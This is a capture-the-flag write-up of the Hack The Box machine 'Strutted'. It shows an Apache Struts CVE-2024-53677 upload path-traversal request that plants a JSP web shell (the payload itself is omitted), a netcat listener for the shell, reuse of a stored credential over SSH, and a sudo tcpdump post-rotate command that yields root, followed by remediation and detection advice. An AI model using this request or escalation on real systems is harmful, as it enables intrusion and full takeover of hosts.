---
title: "Strutted — Apache Struts Upload Path Traversal and tcpdump Sudo Hook"
description: "An exposed application archive identifies legacy Apache Struts upload handling, and CVE-2024-53677 path traversal yields a service-account shell; a stored credential enables SSH, and a sudo tcpdump post-rotate hook reaches root."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - apache-struts
  - cve-2024-53677
  - path-traversal
  - file-upload
  - sudo
  - tcpdump
objective: "Move from an exposed application archive and a legacy Struts upload flaw to root through a service-account foothold, a stored credential, and an over-broad sudo rule."
tools:
  - rustscan
  - feroxbuster
  - netcat
  - grep
  - ssh
  - sudo
  - tcpdump
skill: "Apache Struts upload path traversal and Linux privilege escalation through delegated sudo"
outcome: "Command execution as the Tomcat service account, SSH access for a distinct user via a reused credential, and root through a tcpdump post-rotate hook"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Medium |
| Target environment | Ubuntu Linux; nginx 1.18.0 front end for a Java Apache Struts 6.3.0.1 application |
| Starting position | Unauthenticated network access |
| Objective | Move from an exposed application archive and a legacy Struts upload flaw to root through a service-account foothold, a stored credential, and an over-broad sudo rule |
| Outcome | Command execution as the Tomcat service account, SSH access for a distinct user via a reused credential, and root through a tcpdump post-rotate hook |

## Struts upload traversal to tcpdump root

Strutted is a Medium-rated Hack The Box Linux lab built around a Java Apache Struts application served behind nginx. A downloadable source archive discloses the framework version and a legacy upload interceptor, which points to the file-upload path traversal tracked as CVE-2024-53677; the exploit lands as the Tomcat service account. A credential left in the application server's configuration authenticates over SSH for a distinct user, and an unrestricted `tcpdump` sudo rule reaches root through the binary's post-rotate hook. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).

**Attack path:** **Exposed application archive → legacy `FileUploadInterceptor` upload → CVE-2024-53677 upload path traversal → Tomcat service-account shell → reused application credential over SSH → passwordless `tcpdump` post-rotate hook → root**

## Ubuntu nginx host fronting Struts, source archive to root

- **Target:** an Ubuntu Linux host exposing SSH (22) and HTTP (80); HTTP is served by nginx through a virtual host, so the application is reachable only with the correct `Host` context.
- **Application:** a downloadable source archive identifies Apache Struts 6.3.0.1 and an upload action using the legacy `FileUploadInterceptor` with an image-extension allow-list and magic-byte checks.
- **Starting position:** unauthenticated network access, with no provided credentials.
- **Objective:** follow the upload path from the exposed archive to code execution, then escalate locally by abusing stored credentials and delegated sudo.
- **Constraints:** activity was confined to the Hack The Box lab environment.

## Evidence: source archive, upload traversal, and tcpdump hook

### 1. Service Enumeration

Observation: a full TCP scan exposes SSH and HTTP, and the web service redirects to a virtual host.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN <SCAN_OUTPUT>
```

Truncated scan output:

```text
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://<LAB_VHOST>/
```

Significance: the redirect establishes that web enumeration requires the virtual-host context; SSH is exposed for later authenticated access once credentials are recovered.

Result: SSH and HTTP are exposed by an Ubuntu host fronted by nginx, and the lab virtual host is identified.

### 2. Source Disclosure and Upload-Flow Review

Observation: content discovery returns a downloadable source archive, whose build metadata and configuration identify the framework and an upload action using the legacy interceptor.

```bash
feroxbuster --url http://<LAB_VHOST> --wordlist <CONTENT_WORDLIST>
```

Truncated discovery output:

```text
200 GET http://<LAB_VHOST>/download
```

The archive's `pom.xml` records the framework coordinate:

```text
org.apache.struts:struts2-core:6.3.0.1
```

Its `struts.xml` defines the upload action:

```xml
<action name="upload" class="<UPLOAD_ACTION_CLASS>">
    <interceptor-ref name="fileUpload">
        <param name="maximumSize">2097152</param>
        <param name="allowedExtensions">jpg,jpeg,png,gif</param>
    </interceptor-ref>
    <interceptor-ref name="defaultStack"/>
</action>
```

Significance: Struts 6.3.0.1 falls in the affected range for CVE-2024-53677, and the deprecated `FileUploadInterceptor` is exactly the legacy upload path that vulnerability requires; the extension allow-list and a companion `Upload.java` magic-byte check define the content checks the payload must satisfy.

Result: the archive exposes the framework version and the legacy upload configuration used to assess the traversal.

### 3. Upload Path Traversal (CVE-2024-53677)

Observation: the upload action checks the file extension and image magic bytes, but the server-side destination filename is taken from a request parameter.

Action: submit an image-header-prefixed server-side payload through the upload action and set the filename parameter to a traversal path into a web-served directory. The executable payload is intentionally omitted.

```http
POST /upload.action HTTP/1.1
Host: <LAB_VHOST>
Content-Type: multipart/form-data; boundary=<BOUNDARY>

--<BOUNDARY>
Content-Disposition: form-data; name="Upload"; filename="<IMAGE_NAME>.jpg"
Content-Type: image/jpeg

<IMAGE_HEADER><SANITIZED_SERVER_SIDE_CONTENT>
--<BOUNDARY>
Content-Disposition: form-data; name="top.UploadFileName"

../../<SERVER_SIDE_FILE>.jsp
--<BOUNDARY>--
```

Requesting the uploaded file executes it:

```http
GET /<SERVER_SIDE_FILE>.jsp?cmd=id HTTP/1.1
Host: <LAB_VHOST>
```

```text
uid=<SERVICE_UID>(<SERVICE_ACCOUNT>) gid=<SERVICE_GID>(<SERVICE_ACCOUNT>)
```

Significance: the traversal moves the server-side destination while the image header satisfies the magic-byte check, so a server-side file lands in a processed web directory and executes in the application service context.

Result: command execution as the application service account is confirmed.

### 4. Service-Account Foothold

Observation: command execution runs in the application service context rather than as an authenticated login.

Action: catch an interactive callback on the attacker listener.

```bash
nc -nlvp <LISTENER_PORT>
```

```text
<SERVICE_ACCOUNT>@<TARGET_HOST>:~$ id
uid=<SERVICE_UID>(<SERVICE_ACCOUNT>) gid=<SERVICE_GID>(<SERVICE_ACCOUNT>)
```

Significance: the interactive session confirms the foothold identity and privilege level for local enumeration.

Result: an interactive shell is obtained as the application service account.

### 5. Stored Credential and SSH Access

Observation: the application server directory contains a cleartext credential.

Action: I searched the service configuration for password fields, then tried the recovered value over SSH for another account.

```bash
grep -R "password" <APPLICATION_CONFIG_DIRECTORY> 2>/dev/null
```

Finding:

```xml
<user username="<APPLICATION_ACCOUNT>" password="<APPLICATION_PASSWORD>" roles="<APPLICATION_ROLES>"/>
```

```bash
ssh <SSH_ACCOUNT>@<LAB_VHOST>
```

Significance: a credential readable by the service account becomes a lateral-movement risk when another service accepts it. The documented result is that the same value authenticated over SSH as `<SSH_ACCOUNT>`; I could not verify wider reuse.

Result: SSH access as `<SSH_ACCOUNT>` using the recovered application password.

### 6. Privilege Escalation Through tcpdump

Observation: the SSH user may run `tcpdump` through sudo without a password.

```bash
sudo -l
```

```text
User <SSH_ACCOUNT> may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/sbin/tcpdump
```

Action: invoke `tcpdump` with its post-rotate hook pointed at a staged script, retaining root for the hook.

```bash
sudo /usr/sbin/tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z <POST_ROTATE_SCRIPT> -Z root
```

```text
root@<TARGET_HOST>:/home/<SSH_ACCOUNT># whoami
root
```

Significance: `-G 1` forces packet-file rotation, `-z` runs a post-rotate command, and `-Z root` keeps that hook running as root. An unrestricted sudo rule for this option combination turns the delegated capture tool into privileged command execution.

Result: the post-rotate hook returns a root shell, confirmed by `whoami`.

## Image validation, archive review, and the sudo boundary

| Challenge | Decision | Supported rationale |
|---|---|---|
| Image validation on upload | Prefix the server-side payload with an image header | The upload handler checks the file extension and magic bytes |
| Identifying the upload weakness | Review the exposed archive before assessing the upload action | The archive identified the framework version and legacy interceptor |
| Privilege boundary | Inspect sudo permissions before selecting an escalation path | The recorded `sudo -l` output allowed `tcpdump` |

## Outcome: Tomcat shell, reused credential SSH, and tcpdump root

The documented path includes command execution as the application service account, authenticated SSH access as a separate user from a credential stored in application configuration, and a root context obtained through the delegated `tcpdump` rule.

## Recommendations: exposed archive, legacy upload, credential reuse, and tcpdump sudo

The recommendations remain untested in this lab exercise.

1. **Source archive exposed on the web root.** A downloadable archive disclosed the exact framework version and the upload configuration, which removed the need for guesswork. *Recommendation:* keep build artifacts and source archives out of web-served directories and deploy only the compiled application. *Detection:* alert when requests target archive or build-file extensions under the document root.
2. **Legacy Struts upload handling.** The upload action used the deprecated `FileUploadInterceptor`, whose request-controlled filename lets a payload traverse to a web-served path, the behavior behind CVE-2024-53677. *Recommendation:* upgrade to a patched Struts release and migrate to the current file-upload mechanism, and validate server-side upload destinations independently of request parameters. *Detection:* flag upload requests whose filename parameters contain path-traversal sequences.
3. **Cleartext application credential reused for SSH.** Configuration readable by the service account stored a cleartext password that also authenticated a distinct SSH account. *Recommendation:* keep application secrets out of files readable by the service account, and never share a value between an application account and a system login. *Detection:* alert when an application credential is used to authenticate to a separate service such as SSH.
4. **Unrestricted sudo rule for `tcpdump`.** A passwordless rule allowed running `tcpdump` as any user; its `-z` post-rotate hook executes a command, and `-Z root` retains root for it. *Recommendation:* scope `sudoers` to specific commands and arguments, and never delegate tools that can execute arbitrary hooks. *Detection:* review `sudo -l` output and alert when privileged `tcpdump` invocations use `-z`.

## References

- [Hack The Box — Strutted](https://app.hackthebox.com/machines/Strutted) (retired machine)
- [Apache Struts Security Bulletin S2-067](https://cwiki.apache.org/confluence/display/WW/S2-067) (vendor advisory for CVE-2024-53677)
- [NVD — CVE-2024-53677](https://nvd.nist.gov/vuln/detail/CVE-2024-53677) (Apache Struts file-upload path traversal)
- [RustScan](https://github.com/RustScan/RustScan) (fast port scanner)
- [feroxbuster](https://github.com/epi052/feroxbuster) (web content discovery)
- [GNU grep](https://www.gnu.org/software/grep/) (configuration search)
- [tcpdump manual page](https://www.tcpdump.org/manpages/tcpdump.1.html) (`-z` post-rotate command and `-Z` privilege retention)
